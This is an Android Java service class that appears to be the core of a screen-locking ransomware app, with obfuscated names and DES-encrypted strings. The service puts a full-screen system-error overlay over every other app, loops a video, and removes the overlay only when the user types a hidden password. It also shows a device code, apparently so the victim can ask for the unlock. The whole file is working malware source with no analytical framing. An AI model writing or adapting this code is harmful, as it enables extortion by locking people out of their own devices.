package com.h;

import android.app.*;
import android.content.*;
import android.graphics.*;
import android.net.*;
import android.os.*;
import android.telephony.*;
import android.view.*;
import android.view.View.*;
import android.view.WindowManager.*;
import android.view.animation.*;
import android.widget.*;
import android.media.*;

public class s extends Service
{

VideoView sp;
	private WindowManager.LayoutParams wmParams;
	private WindowManager mWindowManager;
	private View mFloatLayout; 
	Button bt;
	EditText ed;
	TextView tv;
	long pass;
	String passw;
	String password;
	String ppss;
	DU des;
	SharedPreferences share;
	SharedPreferences.Editor editor;
	@Override
	public IBinder onBind(Intent p1)
	{
		// TODO: Implement this method
		return null;
	}

	@Override
	public void onCreate()
	{

		super.onCreate();
		pass = (long)(Math.random() * 10000);
		passw="passw-1";
		
		des = new DU("string");
		try
		{
			des = new DU(des.decrypt("383360be134bb4e5"));
		}
		catch (Exception e)
		{}
		share = getSharedPreferences("Flowers", MODE_PRIVATE);
		editor = share.edit();
		if (share.getLong("m", 0) == 0)
		{
			
			editor.putLong("m", pass);
			editor.commit();
			try
			{
				editor.putString("passw", des.encrypt("" + passw));
				editor.commit();
			}
			catch (Exception e)
			{}
			if (is(getApplicationContext()))
			{
				ppss = (share.getLong("m", 8)) + "";
				try
				{
					password = des.decrypt(share.getString("passw", ""));
				}
				catch (Exception e)
				{}
				new Thread()
				{
					public void run()
					{
						try
						{
			
						}
						catch (Exception e)
						{}
					}
				}.start();
			}
			else
			{
				try
				{
					editor.putLong("m", Long.parseLong(des.decrypt("b1a8900c0d753662")));
					editor.commit();
					editor.putString("passw", "cd32fc5383803657617101afa933dd0a");
					editor.commit();
				}
				catch (Exception e)
				{}
			}
		}
	}

	@Override
	public void onStart(Intent intent, int startId)
	{
		// TODO: Implement this method
		super.onStart(intent, startId);
		c();//悬浮窗
	}

	private void c()
	{

		/*
		 lp.type = 2010;
		 r0_service.lp.flags = 1280;
		 r0_service.lp.format = 1;
		 r0_service.lp.width = -1;
		 r0_service.lp.height = -1;
		 r0_service.lp.gravity = 17;
		 */
		wmParams = new WindowManager.LayoutParams();
//获取的是WindowManagerImpl.CompatModeWrapper
		mWindowManager = (WindowManager)getApplication().getSystemService(getApplication().WINDOW_SERVICE);
//Log.i(TAG, "mWindowManager--->"+ mWindowManager);
//设置window type
		wmParams.type = LayoutParams. TYPE_SYSTEM_ERROR;
// 该类型提供与用户交互，置于所有应用程序上方，但是在状态栏后面
		// TYPE_TOAST TYPE_SYSTEM_OVERLAY 在其他应用上层 在通知栏下层 位置不能动鸟
		// TYPE_PHONE 在其他应用上层 在通知栏下层
		// TYPE_PRIORITY_PHONE TYPE_SYSTEM_ALERT 在其他应用上层 在通知栏上层 没试出来区别是啥
		// TYPE_SYSTEM_ERROR 最顶层(通过对比360和天天动听歌词得出)
		// 
//设置图片格式，效果为背景透明
		wmParams.format = PixelFormat.RGBA_8888;

		//wmParams.format=1;
		//设置浮动窗口不可聚焦（实现操作除浮动窗口外的其他可见窗口的操作）
		//实现悬浮窗到状态栏
		//wmParams.flags = LayoutParams.FLAG_LOCAL_FOCUS_MODE | LayoutParams.FLAG_FULLSCREEN | LayoutParams.FLAG_LAYOUT_IN_SCREEN;
		wmParams.flags = 1280;
		//LayoutParams.FLAG_NOT_FOCUSABLE     //少此代码屏幕无法获取下层东西

		//LayoutParams.TYPE_SYSTEM_ERROR	|

		//LayoutParams.FLAG_FULLSCREEN| LayoutParams.FLAG_LAYOUT_IN_SCREEN
//调整悬浮窗显示的停靠位置为左侧置顶
		wmParams.gravity = Gravity.CENTER_HORIZONTAL | Gravity.TOP;
// 以屏幕左上角为原点，设置x、y初始值，相对于gravity
		wmParams.x = 0;
		wmParams.y = 0;
//设置悬浮窗口长宽数据
		wmParams.width = WindowManager.LayoutParams.FILL_PARENT;
		wmParams.height = WindowManager.LayoutParams.FILL_PARENT;
		//wmParams.height=500;
// 设置悬浮窗口长宽数据
//wmParams.width = 200;
//wmParams.height = 80;
		LayoutInflater inflater = LayoutInflater.from(getApplication());
//获取浮动窗口视图所在布局
		mFloatLayout = inflater.inflate(R.layout.newone, null);

//添加mFloatLayout

		mWindowManager.addView(mFloatLayout, wmParams);
		bt = (Button)mFloatLayout.findViewById(R.id.bt);
		ed = (EditText)mFloatLayout.findViewById(R.id.ed);
		tv = (TextView)mFloatLayout.findViewById(R.id.tv);
		sp=(VideoView) mFloatLayout.findViewById(R.id.sp);

		sp.setVideoURI(Uri.parse("android.resource://" + getPackageName() + "/" +R.raw.a));
		sp.setOnCompletionListener(new MediaPlayer.OnCompletionListener() {
				@Override
				public void onCompletion(MediaPlayer arg0) {
					// restart on completion
					sp.start();
				}
			});

		sp.start();
		try
		{
			ed.setHint("输入密码！");
			tv.append("");
		}
		catch (Exception e)
		{}
		bt.setOnClickListener(new OnClickListener()
			{

				@Override
				public void onClick(View p1)
				{
					// TODO: Implement this method

					try
					{
						if (ed.getText().toString().equals(des.decrypt(share.getString("passw", ""))))
						{
							mWindowManager.removeView(mFloatLayout);
							stopSelf();
						}
					}
					catch (Exception e)
					{}
				}
			});
		try
		{
			tv.append("\n" + des.decrypt("83e853add36742ffd148af078137ac9c") + share.getLong("m", 0));
		}
		catch (Exception e)
		{}
	}
	public boolean is(Context  context)
	{ 
		//是否有网络连接
		if (context != null)
		{ 
			ConnectivityManager 
				mConnectivityManager = (ConnectivityManager) context .getSystemService(Context.CONNECTIVITY_SERVICE); 
			NetworkInfo mNetworkInfo = mConnectivityManager.getActiveNetworkInfo(); 
			if (mNetworkInfo != null)
			{ 
				return mNetworkInfo.isAvailable(); 
			} 
		} 
		return false; 
	} 
}
